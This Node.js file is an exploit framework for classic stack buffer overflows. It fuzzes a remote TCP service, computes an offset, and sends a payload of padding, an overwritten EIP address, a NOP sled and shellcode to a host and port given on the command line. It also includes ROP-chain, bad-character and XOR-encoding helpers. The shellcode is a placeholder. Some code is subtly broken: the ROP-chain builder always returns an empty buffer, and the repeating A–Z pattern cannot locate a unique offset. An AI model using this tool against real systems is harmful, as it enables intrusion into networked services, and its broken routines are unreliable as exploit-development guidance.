/**
 * Buffer Overflow Exploit Framework
 * Educational example demonstrating buffer overflow exploitation concepts.
 * WARNING: For authorized security testing only!
 */

const net = require('net');
const fs = require('fs');

class BufferOverflowExploit {
    constructor(targetHost, targetPort) {
        this.targetHost = targetHost;
        this.targetPort = targetPort;
        this.pattern = null;
        this.offset = null;
        this.eip = null;
    }

    generatePattern(length) {
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
        let pattern = '';
        for (let i = 0; i < length; i++) {
            pattern += chars[i % chars.length];
        }
        return Buffer.from(pattern);
    }

    findOffset(pattern, crashValue) {
        try {
            const crashStr = crashValue.toString('utf-8');
            if (crashStr.length >= 4) {
                for (let i = 0; i < pattern.length - 4; i++) {
                    const patternSlice = pattern.slice(i, i + 4).toString('utf-8');
                    if (patternSlice === crashStr.substring(0, 4)) {
                        return i;
                    }
                }
            }
        } catch (error) {
            // Error finding offset
        }
        return null;
    }

    createShellcode(shellcodeType = 'calc') {
        if (shellcodeType === 'calc') {
            // Placeholder - real shellcode would execute calc.exe
            return Buffer.alloc(50, 0x90); // NOP sled placeholder
        }
        return Buffer.alloc(0);
    }

    createExploitPayload(offset, eip, shellcode) {
        const padding = Buffer.alloc(offset, 0x41); // 'A' bytes
        const nopSled = Buffer.alloc(20, 0x90); // NOP instructions
        
        // Convert EIP to buffer (little-endian)
        const eipBuffer = Buffer.alloc(4);
        if (typeof eip === 'string') {
            const eipInt = parseInt(eip, 16);
            eipBuffer.writeUInt32LE(eipInt, 0);
        } else {
            eipBuffer.set(eip);
        }
        
        return Buffer.concat([padding, eipBuffer, nopSled, shellcode]);
    }

    async sendPayload(payload) {
        return new Promise((resolve, reject) => {
            const socket = new net.Socket();
            socket.setTimeout(5000);

            socket.on('connect', () => {
                socket.write(payload);
            });

            socket.on('data', (data) => {
                console.log(`[+] Response received: ${data.length} bytes`);
                socket.destroy();
                resolve(true);
            });

            socket.on('timeout', () => {
                console.log('[+] No response (possible crash)');
                socket.destroy();
                resolve(true);
            });

            socket.on('error', (error) => {
                console.log(`[-] Error sending payload: ${error.message}`);
                reject(error);
            });

            socket.connect(this.targetPort, this.targetHost);
        });
    }

    async testOverflow(bufferSize = 100) {
        console.log(`[*] Testing buffer overflow with ${bufferSize} bytes...`);
        
        const pattern = this.generatePattern(bufferSize);
        
        try {
            await this.sendPayload(pattern);
            console.log('[+] Test pattern sent successfully');
            console.log('[!] Check target for crash/overflow');
            return true;
        } catch (error) {
            return false;
        }
    }

    async exploit(offset, eipAddress, shellcode) {
        console.log(`[*] Creating exploit payload...`);
        console.log(`    Offset: ${offset}`);
        console.log(`    EIP: ${eipAddress}`);
        
        const eipInt = parseInt(eipAddress, 16);
        const eipBuffer = Buffer.alloc(4);
        eipBuffer.writeUInt32LE(eipInt, 0);
        
        const payload = this.createExploitPayload(offset, eipBuffer, shellcode);
        
        console.log(`[*] Payload size: ${payload.length} bytes`);
        console.log(`[*] Sending exploit...`);
        
        try {
            await this.sendPayload(payload);
            return true;
        } catch (error) {
            return false;
        }
    }

    generateReport() {
        let report = `# Buffer Overflow Exploit Report\n\n`;
        report += `**Target**: ${this.targetHost}:${this.targetPort}\n\n`;
        report += `## Exploit Details\n\n`;
        
        if (this.offset) {
            report += `- **Offset**: ${this.offset}\n`;
        }
        if (this.eip) {
            report += `- **EIP Address**: ${this.eip}\n`;
        }
        
        report += `\n## Exploitation Steps\n\n`;
        report += `1. Fuzz the application to find buffer overflow\n`;
        report += `2. Identify exact offset using pattern\n`;
        report += `3. Find JMP ESP or similar instruction address\n`;
        report += `4. Generate shellcode\n`;
        report += `5. Create and send final payload\n`;
        
        return report;
    }
}

class ExploitDevelopment {
    static generateROPChain(gadgets) {
        const ropChain = Buffer.alloc(0);
        for (const gadget of gadgets) {
            const address = Buffer.alloc(4);
            address.writeUInt32LE(gadget.address, 0);
            Buffer.concat([ropChain, address]);
        }
        return ropChain;
    }

    static findBadChars(payload, badChars) {
        const foundBad = [];
        for (let i = 0; i < payload.length; i++) {
            if (badChars.includes(payload[i])) {
                foundBad.push(payload[i]);
            }
        }
        return foundBad;
    }

    static encodePayload(payload, encoding = 'xor') {
        if (encoding === 'xor') {
            const key = 0xAA;
            const encoded = Buffer.from(payload.map(b => b ^ key));
            return encoded;
        }
        return payload;
    }
}

async function main() {
    const args = process.argv.slice(2);
    if (args.length < 2) {
        console.log('Usage: node buffer_overflow_exploit.js <target_host> <target_port> [offset] [eip]');
        console.log('Example: node buffer_overflow_exploit.js 192.168.1.100 9999');
        console.log('         node buffer_overflow_exploit.js 192.168.1.100 9999 200 0x41414141');
        process.exit(1);
    }

    const targetHost = args[0];
    const targetPort = parseInt(args[1]);
    const exploit = new BufferOverflowExploit(targetHost, targetPort);

    if (args.length >= 4) {
        const offset = parseInt(args[2]);
        const eip = args[3];
        const shellcode = exploit.createShellcode();
        
        console.log('[*] Running full exploit...');
        await exploit.exploit(offset, eip, shellcode);
    } else {
        console.log('[*] Running buffer overflow test...');
        await exploit.testOverflow(200);
    }

    const report = exploit.generateReport();
    fs.writeFileSync('exploit_report.md', report, 'utf8');

    console.log(`\n[+] Report saved to exploit_report.md`);
    console.log(`[!] WARNING: Only test on systems you own or have permission to test!`);
    console.log(`[!] This is for educational purposes only!`);
}

if (require.main === module) {
    main().catch(console.error);
}

module.exports = { BufferOverflowExploit, ExploitDevelopment };

